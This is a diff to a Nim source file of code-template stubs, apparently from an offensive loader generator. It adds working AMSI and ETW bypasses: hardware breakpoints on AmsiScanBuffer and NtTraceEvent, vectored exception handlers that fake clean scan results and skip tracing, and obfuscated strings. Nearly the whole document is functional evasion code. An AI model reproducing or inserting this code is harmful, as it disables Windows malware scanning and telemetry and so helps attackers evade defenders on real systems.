@@ -723,7 +723,180 @@ when isMainModule:
     ProviderPatchAmsi()
 """
 
-let AMSIStub * = """
+let HardwareBreakPointStub * = """
+
+proc setBits(value: uint32, start: int, length: int, newValue: uint32): uint32 =
+    let mask = (1 shl length) - 1
+    (value and not uint32((mask shl start))) or ((newValue and uint32(mask)) shl uint32(start))
+
+proc clearBreakpoint(ctx: PCONTEXT, index: int) =
+    # Clear the releveant hardware breakpoint
+    case index
+    of 0: ctx.Dr0 = 0
+    of 1: ctx.Dr1 = 0
+    of 2: ctx.Dr2 = 0
+    of 3: ctx.Dr3 = 0
+    else: discard
+
+    # Clear DRx HBP to disable for local mode
+    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), (index * 2), 1, 0))
+    ctx.Dr6 = 0
+    ctx.EFlags = 0
+
+proc enableBreakpoint(ctx: PCONTEXT, address: PVOID, index: int) =
+    # Set the releveant hardware breakpoint
+    case index
+    of 0: ctx.Dr0 = cast[ULONG_PTR](address)
+    of 1: ctx.Dr1 = cast[ULONG_PTR](address)
+    of 2: ctx.Dr2 = cast[ULONG_PTR](address)
+    of 3: ctx.Dr3 = cast[ULONG_PTR](address)
+    else: discard
+
+    
+    # Set bits 16-31 as 0, which sets
+    # DR0-DR3 HBP's for execute HBP
+    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), 16, 16, 0))
+    
+    # Set DRx HBP as enabled for local mode
+    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), (index * 2), 1, 1))
+    ctx.Dr6 = 0
+
+
+
+proc getArg(ctx: PCONTEXT, index: int): ULONG_PTR =
+    when defined(amd64):
+        case index
+        of 0: return ctx.Rcx
+        of 1: return ctx.Rdx
+        of 2: return ctx.R8
+        of 3: return ctx.R9
+        else: return cast[ptr ULONG_PTR](ctx.Rsp + ((index + 1) * 8))[]
+    # No x86 Support for the moment, as winim somehow throws errors not finding Esp although its there https://github.com/khchen/winim/blob/master/winim/inc/windef.nim#L570
+    #when not defined(cpu64):
+    #    return cast[ULONG_PTR](ctx.Esp + (index + 1 * 4))
+
+proc getReturnAddress(ctx: PCONTEXT): ULONG_PTR =
+    when defined(amd64):
+        return cast[ptr ULONG_PTR](ctx.Rsp)[]
+    #when defined(i386):
+    #    return cast[ULONG_PTR](ctx.Esp)
+
+proc setResult(ctx: PCONTEXT, result: ULONG_PTR) =
+    #when defined(i386):
+    #    ctx.Eax = result
+    when defined(amd64):
+        ctx.Rax = result
+
+proc adjustStackPointer(ctx: PCONTEXT, amount: int) =
+    #when defined(i386):
+    #    ctx.Esp += amount
+    when defined(amd64):
+        ctx.Rsp += amount
+
+proc setIP(ctx: PCONTEXT, newIP: ULONG_PTR) =
+    #when defined(i386):
+    #    ctx.Eip = newIP
+    when defined(amd64):
+        ctx.Rip = newIP
+
+# we need a custom memset function here, as winim does not have that
+proc memset(dest: pointer, value: int, size: int) =
+    var p = cast[ptr uint8](dest)
+    for i in 0 ..< size:
+        p[i] = uint8(value)
+"""
+
+let AMSIExceptionHandlerStub * = """
+
+var g_amsiScanBufferPtr: PVOID = nil
+var AMSI_RESULT_CLEAN = 0
+type pint = ptr int
+
+proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
+    if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_amsiScanBufferPtr:
+        when defined(verbose):
+            echo "[+] Exception for AmsiScanBuffer!"
+        # Get the return address by reading the value currently stored at the stack pointer
+        let returnAddress = getReturnAddress(exceptions.ContextRecord)
+        
+        when defined(verbose):
+            if (returnAddress == 0):
+                echo obf("[-] Return address is 0")
+            else:
+                echo obf("[+] Return Address: ") & toHex(returnAddress)
+        # Get the address of the 5th argument, which is an int* and set it to a clean result
+        var scanResult: pint = cast[ptr int](getArg(exceptions.ContextRecord, 5))
+        when defined(verbose):
+            echo obf("[*] Real Scan Result: ") & $scanResult[]
+        # Now set the value of the scanResult to AMSI_RESULT_CLEAN
+        scanResult[] = AMSI_RESULT_CLEAN
+        when defined(verbose):
+            echo obf("[*] New scan Result: ") & $scanResult[]
+
+        # update the current instruction pointer to the caller of AmsiScanBuffer
+        
+        setIP(exceptions.ContextRecord, returnAddress)
+        when defined(verbose):
+            echo obf("[*] Set Instruction pointer done")
+        # We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
+        adjustStackPointer(exceptions.ContextRecord, sizeof(PVOID))
+        when defined(verbose):
+            echo obf("[*] Adjust Stack Pointer done")
+        # Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully
+        setResult(exceptions.ContextRecord, S_OK)
+        when defined(verbose):
+            echo obf("[+] S_OK set")
+        # Clear the hardware breakpoint, since we are now done with it
+        when defined(oneshot):
+            clearBreakpoint(exceptions.ContextRecord, 0)
+        when defined(verbose):
+            echo obf("[*] Cleared breakpoint")
+        return EXCEPTION_CONTINUE_EXECUTION
+    else:
+        return EXCEPTION_CONTINUE_SEARCH
+
+"""
+
+let AmsiStub * = """
+
+    proc setupAMSIBypass(): HANDLE =
+        var threadCtx: CONTEXT
+        memset(threadCtx.addr, 0, sizeof(threadCtx))
+        threadCtx.ContextFlags = CONTEXT_ALL
+
+        # Load amsi.dll if it hasn't be loaded alreay.
+        if g_amsiScanBufferPtr == nil:
+            var amsi = GetModuleHandleA(obf("amsi.dll"))
+
+            if amsi == 0:
+                amsi = LoadLibraryA(obf("amsi.dll"))
+
+            if amsi != 0:
+                g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("AmsiScanBuffer")))
+
+            if g_amsiScanBufferPtr == nil:
+                when defined(verbose):
+                    echo obf("[-] Failed to Load AmsiScanBuffer")
+                return 0
+                #quit(1)
+
+        # add our vectored exception handle
+        let hExHandler = AddVectoredExceptionHandler(1, AMSIExceptionHandler)
+
+        # Set a hardware breakpoint on AmsiScanBuffer function
+        if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+            enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
+            SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
+
+        return cast[HANDLE](hExHandler)
+
+    discard setupAMSIBypass()
+
+
+"""
+
+
+let AMSIPatchStub * = """
     proc PatchAmsi(): bool =
         var
             amsi: HMODULE
@@ -881,8 +1054,229 @@ let AMSIStub * = """
     success = PatchAmsi()
     when defined(verbose):
         echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
+
 """
 
+let ETWExceptionHandlerStub * = """
+
+var g_ntTraceEventBufferPtr: PVOID = nil
+
+
+proc ETWExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall.} =
+    if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_ntTraceEventBufferPtr:
+        when defined(verbose):
+            echo obf("[+] Exception for NtTraceEvent!")
+        # Get the return address by reading the value currently stored at the stack pointer
+        let returnAddress = getReturnAddress(exceptions.ContextRecord)
+        
+        when defined(verbose):
+            if (returnAddress == 0):
+                echo obf("[-] Return address is 0")
+            else:
+                echo obf("[+] Return Address: ") & toHex(returnAddress)
+        # Get the address of the 4th argument, which is PVOID to Fields
+        #var Fields: PVOID = cast[PVOID](getArg(exceptions.ContextRecord, 4))
+        #Fields = nil
+        #when defined(verbose):
+        #    echo obf("[+] Fields set to nil")
+        
+        # update the current instruction pointer to the caller of NtTraceEvent
+        
+        setIP(exceptions.ContextRecord, returnAddress)
+        when defined(verbose):
+            echo obf("[*] Set Instruction pointer done")
+        # We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
+        adjustStackPointer(exceptions.ContextRecord, sizeof(PVOID))
+        when defined(verbose):
+            echo obf("[*] Adjust Stack Pointer done")
+        # Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully
+        setResult(exceptions.ContextRecord, S_OK)
+        when defined(verbose):
+            echo obf("[+] S_OK set")
+        # Clear the hardware breakpoint, since we are now done with it
+        #when defined(oneshot):
+        #    clearBreakpoint(exceptions.ContextRecord, 0)
+        #when defined(verbose):
+        #    echo obf("[*] Cleared breakpoint")
+        return EXCEPTION_CONTINUE_EXECUTION
+    else:
+        return EXCEPTION_CONTINUE_SEARCH
+
+"""
+
+let ETWStub * = """
+
+# This function will monitor the current process for new Threads and attach a Hardware Breakpoint to them if they are not already attached.
+    proc monitorThreadsAttach(): void =
+        # Load ntdll.dll if it hasn't be loaded alreay.
+        if g_ntTraceEventBufferPtr == nil:
+            var ntdll = GetModuleHandleA(obf("ntdll.dll"))
+            if ntdll == 0:
+                ntdll = LoadLibraryA(obf("ntdll.dll"))
+            if ntdll != 0:
+                g_ntTraceEventBufferPtr = cast[PVOID](GetProcAddress(ntdll, obf("NtTraceEvent")))
+            if g_ntTraceEventBufferPtr == nil:
+                when defined(verbose):
+                    echo obf("[-] Failed to Load NtTraceEvent")
+                #return 0
+                #quit(1)
+        # add our vectored exception handle
+        let hExHandler = AddVectoredExceptionHandler(1, ETWExceptionHandler)
+        when defined(verbose):
+            echo obf("[*] Monitoring Threads for ") & $GetCurrentProcessId()
+        
+        # assuming, we will not have more than 50 Threads, we'll create 50 context structures for each thread.
+        var threadCtx: array[50, CONTEXT]
+        for i in 0 ..< 50:
+            memset(threadCtx[i].addr, 0, sizeof(threadCtx[i]))
+            threadCtx[i].ContextFlags = CONTEXT_ALL
+        # an endless while loop, to keep monitoring the current process for new Threads
+        # while true: # endless
+        for i in 0 ..< 2:
+            # first we are going to count the number of Threads for the current process.
+            var threadCount: DWORD = 0
+            var threads: array[1024, DWORD]
+            var hThreadSnap: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+            if hThreadSnap == INVALID_HANDLE_VALUE:
+                when defined(verbose):
+                    echo obf("[-] Failed to create thread snapshot")
+                return
+            var te32: THREADENTRY32
+            te32.dwSize = DWORD(sizeof(THREADENTRY32))
+            if Thread32First(hThreadSnap, addr te32) == 0:
+                when defined(verbose):
+                    echo obf("[-] Failed to get first thread")
+                return
+            while Thread32Next(hThreadSnap, addr te32) != 0:
+                if te32.th32OwnerProcessID == GetCurrentProcessId():
+                    threads[threadCount] = te32.th32ThreadID
+                    inc threadCount
+            
+            CloseHandle(hThreadSnap)
+            # Now we have a list of all the threads in the current process, we can iterate through them and attach a hardware breakpoint to them.
+            for i in 0 ..< threadCount:
+                var hThread = OpenThread(THREAD_ALL_ACCESS, false, threads[i])
+                if hThread == 0:
+                    when defined(verbose):
+                        echo obf("[-] Failed to open thread")
+                    return
+                #var context: CONTEXT
+                #context.ContextFlags = CONTEXT_ALL
+                if GetThreadContext(hThread, threadCtx[i].addr) == 0:
+                    when defined(verbose):
+                        echo obf("[-] Failed to get thread context")
+                    return
+                # Check if the thread already has a hardware breakpoint set
+                if (threadCtx[i].Dr7 == 0) or (threadCtx[i].DR7 == DWORD64(0x0000000000000401)#[AMSI Hardware Breakpoint for Main Thread]#):
+                    # Set the hardware breakpoint
+                    enableBreakPoint(threadCtx[i], g_ntTraceEventBufferPtr, 1)
+                    if SetThreadContext(hThread, addr threadCtx[i]) == 0:
+                        when defined(verbose):
+                            echo obf("[-] Failed to set thread context")
+                        return
+                    when defined(verbose):
+                        echo obf("[+] Attached Hardware Breakpoint to Thread: ") & $threads[i]
+                CloseHandle(hThread)
+            # Sleep for 5 second before checking for new threads again
+            Sleep(5000)
+    
+    proc setupETWBypass(): void =
+        
+                
+        # We can now call the monitorThreadsAttach function to attach a hardware breakpoint to all the threads in the current process. We're going to do this
+        # by Calling this function in a new Thread with CreateThread, so that this function can run in the background and monitor for new threads.
+        # Create a new Thread to monitor for new Threads
+        var hThread: HANDLE = 0
+        var threadId: DWORD = 0
+        hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](monitorThreadsAttach), nil, 0, addr threadId)
+        WaitForSingleObject(hThread, 1000)
+        if hThread == 0:
+            when defined(verbose):
+                echo obf("[-] Failed to create thread")
+
+    #[
+    proc setupETWBypass(): HANDLE =
+        
+        # Load ntdll.dll if it hasn't be loaded alreay.
+        if g_ntTraceEventBufferPtr == nil:
+            var ntdll = GetModuleHandleA(obf("ntdll.dll"))
+
+            if ntdll == 0:
+                ntdll = LoadLibraryA(obf("ntdll.dll"))
+
+            if ntdll != 0:
+                g_ntTraceEventBufferPtr = cast[PVOID](GetProcAddress(ntdll, obf("NtTraceEvent")))
+
+            if g_ntTraceEventBufferPtr == nil:
+                when defined(verbose):
+                    echo obf("[-] Failed to Load NtTraceEvent")
+                return 0
+                #quit(1)
+
+        # add our vectored exception handle
+        let hExHandler = AddVectoredExceptionHandler(1, ETWExceptionHandler)
+        
+        # We can now call the monitorThreadsAttach function to attach a hardware breakpoint to all the threads in the current process. We're going to do this
+        # by Calling this function in a new Thread with CreateThread, so that this function can run in the background and monitor for new threads.
+
+        # Create a new Thread to monitor for new Threads
+        #[]#
+        var hThread: HANDLE = 0
+        var threadId: DWORD = 0
+        hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](monitorThreadsAttach), nil, 0, addr threadId)
+        WaitForSingleObject(hThread, 1000)
+        if hThread == 0:
+            when defined(verbose):
+                echo obf("[-] Failed to create thread")
+            return 0
+            #quit(1)
+        # We can now return the handle to the Vectored Exception Handler, so that we can remove it later.
+        return hExHandler
+      ]#  
+    #[
+        var threadCtx: CONTEXT
+        memset(threadCtx.addr, 0, sizeof(threadCtx))
+        threadCtx.ContextFlags = CONTEXT_ALL
+
+        # Now, we need to set this Breakpoint for each Thread of the current process, as otherwise ETW data is still generated from other Threads.
+        # We can do this by using the NtQueryInformationThread function to get the ThreadBasicInformation for each Thread, and then using the
+        # ThreadBasicInformation.ThreadId to get the Thread Handle, and then using the NtSetContextThread function to set the hardware breakpoint
+        # for each Thread. But for the first implementation, CreateToolhelp32Snapshot and SetThreadContext will be used.
+
+        # Get a handle to the snapshot of the current process
+        let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+
+        if hSnapshot != INVALID_HANDLE_VALUE:
+            var te32: THREADENTRY32
+            te32.dwSize = sizeof(THREADENTRY32)
+
+            # Get the first thread
+            if Thread32First(hSnapshot, te32.addr):
+                # Loop through all the threads
+                while Thread32Next(hSnapshot, te32.addr):
+                    # Check if the thread belongs to the current process
+                    if te32.th32OwnerProcessID == getCurrentProcessId():
+                        # Get a handle to the thread
+                        let hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID)
+
+                        if hThread != 0:
+                            # Get the context of the thread
+                            if GetThreadContext(hThread, threadCtx.addr):
+                                # Set a hardware breakpoint on NtTraceEvent function
+                                enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
+                                SetThreadContext(hThread, threadCtx.addr)
+
+                            CloseHandle(hThread)
+
+            CloseHandle(hSnapshot)
+      
+
+        return cast[HANDLE](hExHandler)
+    ]#
+
+    setupETWBypass()
+
+"""
 
 let ETWPatchStub * = """
     proc Patchntdll(): bool =
